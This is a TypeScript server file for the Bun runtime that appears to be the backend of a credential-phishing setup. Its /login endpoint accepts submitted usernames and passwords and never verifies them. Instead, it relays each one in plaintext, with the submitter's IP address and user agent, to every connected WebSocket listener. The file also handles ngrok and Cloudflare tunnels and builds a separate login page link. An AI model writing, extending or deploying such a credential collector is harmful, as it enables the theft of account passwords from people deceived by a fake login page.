import os from 'os'

function getLocalIP(): string {
  const ifaces = os.networkInterfaces()
  for (const name of Object.keys(ifaces)) {
    for (const iface of ifaces[name] || []) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address
      }
    }
  }
  return '127.0.0.1'
}

function getRequestHost(hostHeader: string | null, localIp: string): string {
  const fallback = `${localIp}:3080`
  if (!hostHeader) return fallback

  try {
    const url = new URL(`http://${hostHeader}`)
    const hostname = url.hostname.replace(/^\[|\]$/g, '').toLowerCase()
    const port = url.port
    const isLocalhost =
      hostname === 'localhost' ||
      hostname === '127.0.0.1' ||
      hostname === '::1' ||
      hostname === '0.0.0.0'

    if (isLocalhost) {
      return `${localIp}:${port || '3080'}`
    }

    return port ? `${url.hostname}:${port}` : url.hostname
  } catch {
    return fallback
  }
}

function isHttpsRequest(req: Request, host: string): boolean {
  const forwardedProto = req.headers.get('x-forwarded-proto')?.split(',')[0]?.trim()

  return (
    forwardedProto === 'https' ||
    host.includes('trycloudflare.com') ||
    host.includes('ngrok.io') ||
    host.includes('ngrok.app') ||
    host.includes('ngrok-free.app') ||
    process.env.HTTPS === 'true'
  )
}

const clients = new Set<WebSocket>()

const server = Bun.serve({
  hostname: '0.0.0.0',
  port: 3080,
  async fetch(req, server) {
    const url = new URL(req.url)

    const corsHeaders: Record<string, string> = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    }

    if (req.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders })
    }

    if (url.pathname === '/login' && req.method === 'POST') {
      try {
        const body = await req.json()
        const payload = {
          type: 'login' as const,
          data: {
            username: String(body.username ?? ''),
            password: String(body.password ?? ''),
            timestamp: new Date().toISOString(),
            ip: server.requestIP(req)?.address ?? 'unknown',
            userAgent: req.headers.get('user-agent') ?? 'unknown'
          }
        }
        const message = JSON.stringify(payload)
        for (const ws of clients) {
          ws.send(message)
        }
        return new Response(JSON.stringify({ success: true }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        })
      } catch {
        return new Response(JSON.stringify({ success: false, error: 'invalid json' }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        })
      }
    }

    if (url.pathname === '/ws') {
      const ok = server.upgrade(req)
      if (ok) return undefined
    }

    if (url.pathname === '/api/server-info') {
      const ip = getLocalIP()
      const host = getRequestHost(req.headers.get('host'), ip)
      const isHttps = isHttpsRequest(req, host)

      const scheme = isHttps ? 'https' : 'http'
      const wsScheme = isHttps ? 'wss' : 'ws'

      const backendUrl = process.env.BACKEND_URL || `${scheme}://${host}`
      let loginUrl = process.env.LOGIN_URL || `http://${ip}:3000`
      const wsUrl = process.env.WS_URL || `${wsScheme}://${host}/ws`

      try {
        const loginUrlObj = new URL(loginUrl)
        if (!loginUrlObj.searchParams.has('backend')) {
          loginUrlObj.searchParams.set('backend', backendUrl)
        }
        loginUrl = loginUrlObj.toString()
      } catch {
      }

      return new Response(
        JSON.stringify({
          ip,
          loginUrl,
          wsUrl,
          backendUrl
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      )
    }

    return new Response('Not Found', { status: 404 })
  },
  websocket: {
    open(ws) {
      clients.add(ws)
    },
    close(ws) {
      clients.delete(ws)
    },
    message() {}
  }
})

console.log(`Backend running at http://localhost:${server.port}`)
console.log(`LAN backend URL: http://${getLocalIP()}:${server.port}`)
console.log(`WebSocket endpoint: ws://localhost:${server.port}/ws`)
